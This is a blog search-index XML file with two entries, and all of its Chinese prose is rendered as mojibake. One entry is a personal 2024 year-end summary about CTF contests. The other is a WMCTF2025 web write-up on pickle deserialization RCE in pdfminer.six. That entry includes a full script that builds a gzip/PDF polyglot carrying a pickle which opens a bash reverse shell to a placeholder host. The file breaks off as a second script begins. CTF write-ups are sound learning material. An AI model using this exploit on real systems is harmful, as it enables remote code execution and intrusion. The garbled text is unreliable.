<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024å¹´ç»ˆæ€»ç»“</title>
    <link href="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>å¹´ç»ˆæ€»ä¸ªç»“ã€‚</p><h1 id="ç«èµ›ä¹‹è·¯"><a href="#ç«èµ›ä¹‹è·¯" class="headerlink" title="ç«èµ›ä¹‹è·¯"></a>ç«èµ›ä¹‹è·¯</h1><p>ä»Šå¹´å»äº†ç¦å»ºï¼Œå¤©æ´¥ï¼Œæˆéƒ½ï¼Œå¹¿å·ï¼Œè´µé˜³ï¼Œå¤§æ±Ÿå—åŒ—çœŸæ˜¯è·¯æ¼«æ¼«å•Šã€‚<br>å¹´åˆæ²‰æ·€ç•¥è¿‡ï¼ˆ</p><p>ä»Šå¹´å››æœˆä¸»åŠ¨è¯·ç¼¨ï¼Œå‘½è¿çš„é½¿è½®ä¹Ÿè®¸å°±æ­¤å¼€å§‹è½¬åŠ¨ã€‚çœŸçš„å°±æ„Ÿè§‰å†™ç”·é¢‘å°è¯´ä¸€æ ·å•Šã€‚</p><p>æˆ‘å¿˜ä¸äº†åœ¨ç¦å»ºä¸‰æ˜çº¢æ˜è°·çš„åŠ›ä¸ä»å¿ƒï¼Œåˆå‡ºèŒ…åºä½†é“©ç¾½è€Œå½’ï¼Œå‰äºŒåä½†ä¸€ä¸ªå¥–æ²¡å¾—åˆ°ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170513547.png" alt="image-20241231170513547"></p><p>æˆ‘å¿˜ä¸äº†åœ¨å¤©æ´¥å¤§å­¦çš„å›½èµ›åŠå†³èµ›å‰ä¸€æ™šçš„å½»å¤œéš¾çœ ï¼ŒååŒ—80è¿›9æ®‹é…·è‡³æï¼Œè¿˜å¥½æœ‰æƒŠæ— é™©ç¬¬äº”è¿›çº¿ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170556216.png" alt="image-20241231170556216"></p><p>æˆ‘æœ€æœ€æœ€æœ€å¿˜ä¸äº†åœ¨å››å·å¤§å­¦å›½èµ›å†³èµ›çš„AWDPå’Œæ¸—é€é¾™åœºæ‚Ÿé“ï¼Œç›´è‡³å‡»è´¥å¤§åƒä¸–ç•Œæ‰€æœ‰ç«äº‰è€…ï¼Œè·å¾—å…¨å›½æ€»å† å†›ï¼Œå›½ä¸€ä¸­çš„å›½ä¸€ã€‚(ä¸Šå»é¢†å¥–äº†å˜»å˜»ï¼ŒçŠ¹è®°å¾—å·å¤§ç½‘å®‰é™¢é™¢é•¿ç«™æˆ‘å³è¾¹ï¼Œè·Ÿæˆ‘è¯´ä»Šå¹´å† å†›åˆæ˜¯åŒ—é‚®çš„ï¼Œå­¦é•¿æ‰æ˜¯çœŸæ­£çš„ç¥è¯å•Šww)</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170712495.png" alt="image-20241231170712495"></p><p>å½“ç„¶ä¸»åŠæ–¹ä¸´æ—¶è®©æˆ‘ä½œä¸ºä»£è¡¨å‘è¨€è®©æˆ‘æ›´åŠ å±€ä¿ƒä¸å·²(ä¸‹é¢å¯æ˜¯æœ‰é™¢å£«å•Šå§æ§½äº†æˆ‘ä½•å¾·ä½•èƒ½ã€‚ã€‚ã€‚)</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170836313.png" alt="image-20241231170836313"></p><p>æˆ‘ä¹Ÿå¿˜ä¸äº†åœ¨å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨çš„å¹¿å·ç¾ŠåŸæ¯ï¼Œå­¦é•¿ä»¬ç›´æ¥æ€ç©¿äº†é¶åœºæš´ç å† å†›ï¼Œæˆ‘ä»¬å·®å‡ é“akçš„äºšå†›ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170911882.png" alt="image-20241231170911882"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170957541.png" alt="image-20241231170957541"></p><p>æˆ‘å¿˜ä¸äº†åœ¨å¤©æ´¥çš„äº¬æ´¥å†€æ”»é˜²å¤§èµ›ï¼Œå¸¦ç€å­¦å¼Ÿä¸€èµ·å†ç»ƒï¼ŒAWDçš„æ”»é˜²è¿æ‰“ä¹‹ä¸‹åˆè±ªå–å† å†›ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231171407522.png" alt="image-20241231171407522"></p><p>æˆ‘ä¹Ÿå¿˜ä¸äº†ä»Šå¹´æœ€åä¸€æ¬¡çº¿ä¸‹ï¼Œæ˜¯å¤©æ¢è€å­¦é•¿ä»¬å€¾å·¢å‡ºåŠ¨çš„è´µé˜³ç½‘é¼æ¯ï¼Œæˆ‘å‹’ä¸ªç½‘ç»œå®‰å…¨å¥¥è¿ä¼šå•Šï¼ˆ</p><p>ä½†æ˜¯å¤ªæŠ½è±¡äº†ï¼ŒçœŸçš„æ‰“ä¸è¿‡ã€‚ã€‚ã€‚åªèƒ½è¯´èœçœŸå¾—å¤šç»ƒå§ã€‚</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231171638104.png" alt="image-20241231171638104"></p><p>ä»Šå¹´çš„æ¯”èµ›è‡³æ­¤åˆ’ä¸€æ®µè½ã€‚æˆ‘è®¤ä¸ºæˆ‘æ˜¯å–œæ¬¢æ‰“CTFçš„ã€‚æˆ‘å¾ˆå–œæ¬¢ç¾¤é‡Œèƒ½ç¬¬ä¸€ä¸ªå–Šå‡ºâ€œé™¤äº†â€â€œå‡ºäº†â€â€œäº¤äº†â€çš„æ„Ÿè§‰ï¼Œæˆ‘å–œæ¬¢çº¿ä¸Šä¸€æ¬¡æ¬¡æŠ¢è¡€è§£é¢˜çš„å¿«æ„æ©ä»‡ï¼Œæˆ‘å–œæ¬¢çº¿ä¸‹é¢å¯¹é¢ææ€çš„ç‹­è·¯ç›¸é€¢ã€‚</p><p>æˆ–è®¸ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æˆ‘ä¹Ÿä¸æ‰“äº†ï¼Œä½†æ˜¯æˆ‘è§‰å¾—å®ƒçš„ç¡®ç»™æˆ‘æœ¬å°±æ— è¶£çš„å¤§å­¦ç”Ÿæ´»ç•™ä¸‹äº†æµ“å¢¨é‡å½©çš„ä¸€ç¬”ï¼Œæ­¤è·¯è™½å…³å±±éš¾è¶Šï¼Œä½†ä»è½å­æ— æ‚”ã€‚</p><h1 id="ç¤¾äº¤æ–¹é¢"><a href="#ç¤¾äº¤æ–¹é¢" class="headerlink" title="ç¤¾äº¤æ–¹é¢"></a>ç¤¾äº¤æ–¹é¢</h1><p>ä¸€å¨å‹¾ä½¿ã€‚</p><p>ä¸ºäº†ä»€ä¹ˆæ¯”èµ›ä»€ä¹ˆç»©ç‚¹ï¼Œæˆ‘æ„Ÿè§‰æˆ‘çš„ç”Ÿæ´»é‡Œå°‘äº†å¤ªå¤šç¤¾äº¤ï¼Œä¹Ÿå°‘äº†å¤ªå¤šç”Ÿæ´»çš„è¶£å‘³ã€‚</p><p>æˆ‘åœ¨ä¸Šå­¦æœŸæ‰æ…¢æ…¢æƒ³æ˜ç™½æˆ‘çš„å¤§å­¦ç”Ÿæ´»çœŸçš„å¤ªæ— è¶£äº†ã€‚çœŸçš„ã€‚</p><p>æ‰€ä»¥æˆ‘æ…¢æ…¢å¼€å§‹æ”¹å˜ï¼Œæ¸æ¸æ‰¾åˆ°ç”Ÿæ´»é‡Œçš„å¹³è¡¡ç‚¹ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹å¤ªå­¤ç‹¬äº†ï¼Œä¹Ÿè®¸ã€‚</p><p>ä»Šå¹´åˆä¸€ä¸ªäººå»äº†å¤©å®‰é—¨ï¼Œæ¸…æ˜èŠ‚ç‹¬è‡ªåŠå”æ¯›ä¸»å¸­ã€‚</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231172746530.png" alt="image-20241231172746530"></p><p>äº”ä¸€ä»Šå¹´åˆæ˜¯ä¸€ä¸ªäººå»éŸ³ä¹èŠ‚ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±çå—¨ä»€ä¹ˆï¼Œä¸€åˆ‡ç»“æŸååªå‰©ä¸‹æˆ‘ä¸€ä¸ªäººæ…¢æ…¢çš„èµ°ï¼Œæ…¢æ…¢çš„èµ°ã€‚</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173013968.png" alt="image-20241231173013968"></p><p>åœ¨æœ€åä¸å…¶ä»–äººåœ¨èµ¶ä¸Šæœ«ç­åœ°é“çš„å¥”è·‘ä¸­ï¼Œæˆ‘ä»¿ä½›æ‰æ„Ÿè§‰åˆ°äº†æˆ‘çš„å­˜åœ¨ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173017589.png" alt="image-20241231173017589"></p><p>è·ŸåŒå­¦ç©äº†äº›æ²‰æµ¸å‰§åœºï¼Œæ„Ÿè§‰æŒºçˆ½çš„ï¼ˆä¸­æˆç§‘ç­å‡ºèº«çš„æ¼”å‘˜çœŸå°±æ˜¯ä¸ä¸€æ ·å•Šï¼Œè´¨æ„Ÿå¤ªå¥½äº†ï¼‰ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173232621.png" alt="image-20241231173232621"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173342849.png" alt="image-20241231173342849"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173345531.png" alt="image-20241231173345531"></p><p>ä¹Ÿå’Œä¸‰äº”å¥½å‹å–äº†å–ğŸºï¼Œå°è±¡æœ€æ·±çš„å°±æ˜¯é‚£æ¬¡ç›´æ¥æ™šä¸Š9ç‚¹ä¸‹è¯¾å»drinkï¼Œæ™šä¸Šç¡KTVå‡Œæ™¨äº”ç‚¹æ‰“çƒŠäº†èµ°å›å­¦æ ¡hhhhï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173616378.png" alt="image-20241231173616378"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173622318.png" alt="image-20241231173622318"></p><p>æˆ‘ç›¸ä¿¡æœ‰ä¸€å¤©å°çƒæŠ€æœ¯ä¹Ÿèƒ½ç»ƒæˆåƒå­¦é•¿é‚£æ ·é«˜æ‰‹çš„ã€‚</p><p>å›½åº†èŠ‚çš„è¥„é˜³ä¹‹è¡Œä¹Ÿæ˜¯ä»¤äººéš¾å¿˜å•Š</p><p>ï¼ˆè¢«è¾ç…§å·æ‹</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174133742.png" alt="image-20241231174133742"></p><p>æ˜Ÿè½å¦‚é›¨çš„æ‰“é“èŠ±ï¼Œçœ‹ç—´äº†ï¼ˆä¸‹ä¸€å¹´äº‰å–ä¹°ä¸ªå¥½ç‚¹çš„ç›¸æœºå‡ºå»ç©èƒ½ç…§å¥½çœ‹ç‚¹å§</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174149017.png" alt="image-20241231174149017"></p><p>åèˆ¹æ„Ÿè§‰å€¼å›ç¥¨ä»·äº†ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174325010.png" alt="image-20241231174325010"></p><p>è¿˜æœ‰ç™»ç¥é•¿é˜¶çš„æ­¦å½“å±±ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174310098.png" alt="image-20241231174310098"></p><p>å¥½åƒæ²¡ç©å•¥äº†ï¼Œç©çš„æ¯”è¾ƒå°‘ã€‚ã€‚</p><p>æˆ‘è§‰å¾—æˆ‘è¿˜æ˜¯å¾—å½“ä¸€ä¸ªç°å……ã€‚</p><p>ğŸ€ä¸å¸¸æ‰“äº†ï¼Œç°åœ¨è¢«å¥èº«ä¿˜è™äº†ï¼Œå’Œé­”é¬¼æ•™ç»ƒDoubleLiçš„è®­ç»ƒä¹Ÿç®—å“æœ‰æˆæ•ˆäº†hhhã€‚</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231175232348.png" alt="image-20241231175232348"></p><p>ä¸‹ä¸€å¹´æ²¡å•¥äº‹äº†å¤šæ‰“æ‰“ğŸ€å§ï¼Œå°±æ˜¯åŒ—äº¬å†·å¾—å¤ªå¿«ï¼Œå®¤å¤–æ‰“ç€å¤ªéš¾å—äº†ã€‚</p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>å…¶ä»–çš„äº‹æƒ…æ„Ÿè§‰æ²¡å•¥å¥½è®²çš„ï¼Œå°±è¿™æ ·å§ï¼ˆæœŸæœ«è¿˜å‰©äº”ç§‘ï¼Œä½ é‚®çš„ç½‘å®‰å¤§ä¸‰ä¸ŠçœŸæ˜¯çƒ‚å®Œäº†ï¼‰</p><p>æ–°çš„ä¸€å¹´é‡Œå¸Œæœ›èƒ½æˆä¸ºè‡ªå·±æƒ³è¦æˆä¸ºçš„äººï¼Œå¤šå†™ç‚¹é«˜è´¨é‡åšå®¢ï¼Œå¤šæ‹ç‚¹é«˜è´¨é‡ç…§ï¼Œå¤šå’Œå€¼å¾—ç©çš„äººä¸€èµ·ç©ã€‚</p><p>ï¼ˆèƒ½æˆä¸ºç°å……å—ï¼Ÿä¹Ÿè®¸ä¸å¤ªè¡Œã€‚ã€‚ã€‚å¿™çš„ä¸€æ‰¹ï¼‰</p><p>ç¥å„ä½èƒ½å’Œä»Šå¤©é™ªè‡ªå·±è·¨å¹´çš„äººå¼€å¼€å¿ƒå¿ƒï¼Œå¹¸ç¦å¿«ä¹ã€‚</p><p>åƒè¨€ä¸‡è¯­æ±‡æˆä¸€å¥ï¼Œ2025å…±å‹‰ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å…¶ä»–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025-WEB-Learning</title>
    <link href="/2025/09/26/WMCTF2025-WEB-Learning/"/>
    <url>/2025/09/26/WMCTF2025-WEB-Learning/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç®€å•çœ‹çœ‹ã€‚</p><h2 id="pdf2text"><a href="#pdf2text" class="headerlink" title="pdf2text"></a>pdf2text</h2><p>pickleæ‰¾é“¾å­æ‰“ååºåˆ—åŒ–ã€‚</p><p>æœ€åçš„<code>pickle.loads</code>åœ¨ï¼š</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162003698.png" alt="image-20250926162003698"></p><p>èƒ½å‚è€ƒåˆ°ï¼š</p><p><a href="https://github.com/pdfminer/pdfminer.six/blob/51683b2528e2aa685dd8b9e61f6ccf9f76a59a62/pdfminer/cmapdb.py#L233-L249">pdfminer.six&#x2F;pdfminer&#x2F;cmapdb.py at 51683b2528e2aa685dd8b9e61f6ccf9f76a59a62 Â· pdfminer&#x2F;pdfminer.six Â· GitHub</a></p><p>å¯ä»¥è·Ÿä¸€ä¸‹<code>GadGet</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">high_level.py::extract_pages()<br>pdfinterp.py::PDFPageInterpreter.process_page(page)<br>pdfinterp.py::PDFPageInterpreter.render_contents(resources, contents)<br>pdfinterp.py::PDFPageInterpreter.init_resources(resources)<br>pdfinterp.py::PDFResourceManager.get_font(objid, spec)<br>pdffont.py::PDFCIDFont.__init__(rsrcmgr, spec, strict)<br>pdffont.py::PDFCIDFont.get_cmap_from_spec(spec, strict)<br>cmapdb.py::CMapDB.get_cmap(cmap_name)<br>cmapdb.py::CMapDB._load_data(name)<br></code></pre></td></tr></table></figure><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162041089.png" alt="image-20250926162041089"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162136128.png" alt="image-20250926162136128"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162155329.png" alt="image-20250926162155329"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162214328.png" alt="image-20250926162214328"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162228313.png" alt="image-20250926162228313"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162244289.png" alt="image-20250926162244289"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162252269.png" alt="image-20250926162252269"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162301023.png" alt="image-20250926162301023"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162315188.png" alt="image-20250926162315188"></p><p>æ€è·¯å°±æ˜¯å…ˆæ‰“ä¸€ä¸ªgzipå‹ç¼©å¹¶èƒ½ç»•è¿‡PDFæ£€æµ‹çš„å«æ¶æ„Opcodeæ•°æ®æ–‡ä»¶è¿›å»ï¼ˆå¯ä»¥æ‰‹æ“ä¹Ÿå¯<code>pickle.dumps</code>ç”Ÿæˆï¼‰ï¼Œè‡³æ­¤ç•™ä¸‹æ¶æ„pickleæ•°æ®ï¼›</p><p>ä¹‹åå†æ‰“å…¥ä¸€ä¸ªæ¶æ„pdfæ–‡ä»¶è§¦å‘ä¸Šè¿°<code>GadGet</code>çš„<code>pickle.loads</code>ååºåˆ—åŒ–RCEã€‚</p><p>æ³¨æ„pdfminerä¼šåœ¨å‰çº¦ 1KBèŒƒå›´å†…æ‰«æ <code>%PDF-</code>ï¼Œè€Œä¸è¦æ±‚ä»<code>offset 0</code>å¼€å§‹ï¼›ä¸€æ—¦æ‰¾åˆ°å°±æŒ‰ PDF è§„èŒƒç»§ç»­è§£æã€‚æ®æ­¤å¯æ„é€ ç±»ä¼¼polyglotçš„æ—¢æ˜¯åˆæ³• <code>PDF</code>ã€åˆèƒ½è¢« <code>gzip</code> æŒ‰è§„èŒƒè¯»å–çš„<code>evil.pickle.gz</code>ã€‚</p><p>æœ¬æ¥<code>/</code>è¿‡ä¸å»ï¼Œä½†æ˜¯ç”Ÿæˆpdfæ—¶<code>/Encoding</code>æŒ‡å‘pickle.gzç»å¯¹è·¯å¾„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨<code>#2F</code>è½¬ä¹‰ç»•è¿‡ PDFNameå¯¹è±¡é™åˆ¶ï¼š</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="genPickle-py"><a href="#genPickle-py" class="headerlink" title="genPickle.py"></a>genPickle.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib, struct, pickle, binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_pdf</span>(<span class="hljs-params">abs_base: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    header = <span class="hljs-string">b&quot;%PDF-1.7\n%\xe2\xe3\xcf\xd3\n&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">obj</span>(<span class="hljs-params">n, body: <span class="hljs-built_in">bytes</span></span>): <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;n&#125;</span> 0 obj\n&quot;</span>.encode()+body+<span class="hljs-string">b&quot;\nendobj\n&quot;</span><br><br>    objs = []<br>    objs.append(obj(<span class="hljs-number">1</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>))<br>    objs.append(obj(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Pages /Count 1 /Kids [3 0 R] &gt;&gt;&quot;</span>))<br>    page = <span class="hljs-string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; /Contents 5 0 R &gt;&gt;&quot;</span><br>    objs.append(obj(<span class="hljs-number">3</span>, page))<br>    objs.append(obj(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Font /Subtype /Type1 /BaseFont /Helvetica &gt;&gt;&quot;</span>))<br>    stream = <span class="hljs-string">b&quot;BT /F1 12 Tf (hello polyglot) Tj ET&quot;</span><br>    objs.append(obj(<span class="hljs-number">5</span>, <span class="hljs-string">b&quot;&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="hljs-built_in">len</span>(stream) + stream + <span class="hljs-string">b&quot;\nendstream&quot;</span>))<br><br>    body = header<br>    offsets_abs = []<br>    cursor_abs = abs_base + <span class="hljs-built_in">len</span>(header)<br>    <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> objs:<br>        offsets_abs.append(cursor_abs)<br>        body += o<br>        cursor_abs += <span class="hljs-built_in">len</span>(o)<br><br>    <span class="hljs-comment"># xref stream (/W [1 4 2])ï¼štype(1B)+offset(4B BE)+gen(2B)</span><br>    entries = [<span class="hljs-string">b&quot;\x01&quot;</span> + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, off) + <span class="hljs-string">b&quot;\x00\x00&quot;</span> <span class="hljs-keyword">for</span> off <span class="hljs-keyword">in</span> offsets_abs]<br>    xref_stream = zlib.compress(<span class="hljs-string">b&quot;&quot;</span>.join(entries))<br>    xref_obj = (<br>        <span class="hljs-string">b&quot;6 0 obj\n&quot;</span><br>        <span class="hljs-string">b&quot;&lt;&lt; /Type /XRef /Size 7 /Root 1 0 R /W [1 4 2] /Index [1 5] &quot;</span><br>        <span class="hljs-string">b&quot;/Filter /FlateDecode /Length &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(xref_stream)).encode() + <span class="hljs-string">b&quot; &gt;&gt;\nstream\n&quot;</span> +<br>        xref_stream + <span class="hljs-string">b&quot;\nendstream\nendobj\n&quot;</span><br>    )<br><br>    startxref_abs = abs_base + <span class="hljs-built_in">len</span>(body)<br>    trailer = <span class="hljs-string">b&quot;startxref\n&quot;</span> + <span class="hljs-built_in">str</span>(startxref_abs).encode() + <span class="hljs-string">b&quot;\n%%EOF\n&quot;</span><br>    <span class="hljs-keyword">return</span> body + xref_obj + trailer<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_gzip_with_extra</span>(<span class="hljs-params">extra_pdf: <span class="hljs-built_in">bytes</span>, payload: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    ID1, ID2, CM = <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">8</span><br>    FLG, MTIME, XFL, OS = <span class="hljs-number">0x04</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(extra_pdf) &gt; <span class="hljs-number">65535</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;FEXTRA &gt;65535&quot;</span>)<br><br>    header  = <span class="hljs-built_in">bytes</span>([ID1, ID2, CM, FLG])<br>    header += struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, MTIME)<br>    header += <span class="hljs-built_in">bytes</span>([XFL, OS])<br>    header += struct.pack(<span class="hljs-string">&quot;&lt;H&quot;</span>, <span class="hljs-built_in">len</span>(extra_pdf))<br>    header += extra_pdf<br><br>    comp = zlib.compressobj(level=<span class="hljs-number">9</span>, wbits=-<span class="hljs-number">15</span>)<br>    deflated = comp.compress(payload) + comp.flush()<br><br>    crc   = binascii.crc32(payload) &amp; <span class="hljs-number">0xffffffff</span><br>    isize = <span class="hljs-built_in">len</span>(payload) &amp; <span class="hljs-number">0xffffffff</span><br>    trailer = struct.pack(<span class="hljs-string">&quot;&lt;II&quot;</span>, crc, isize)<br><br>    <span class="hljs-keyword">return</span> header + deflated + trailer<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cmd = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span><br><br>    expr = (<br>        <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(%r) or &quot;</span><br>        <span class="hljs-string">&quot;&#123;&#x27;decode&#x27;: (lambda self, b: [])&#125;&quot;</span><br>    ) % cmd<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span>:<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>            <span class="hljs-keyword">import</span> builtins<br>            <span class="hljs-keyword">return</span> (builtins.<span class="hljs-built_in">eval</span>, (expr,))<br><br>    payload = pickle.dumps(POC(), protocol=<span class="hljs-number">2</span>)<br><br>    pdf = build_pdf(abs_base=<span class="hljs-number">12</span>)<br>    poly = build_gzip_with_extra(extra_pdf=pdf, payload=payload)<br><br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.pickle.gz&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(poly)<br>    <span class="hljs-keyword">assert</span> poly[:<span class="hljs-number">4</span>] == <span class="hljs-string">b&quot;\x1f\x8b\x08\x04&quot;</span><br>    <span class="hljs-keyword">assert</span> poly.find(<span class="hljs-string">b&quot;%PDF-&quot;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> poly.find(<span class="hljs-string">b&quot;%PDF-&quot;</span>) &lt; <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><h4 id="genPDF-py"><a href="#genPDF-py" class="headerlink" title="genPDF.py"></a>genPDF.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 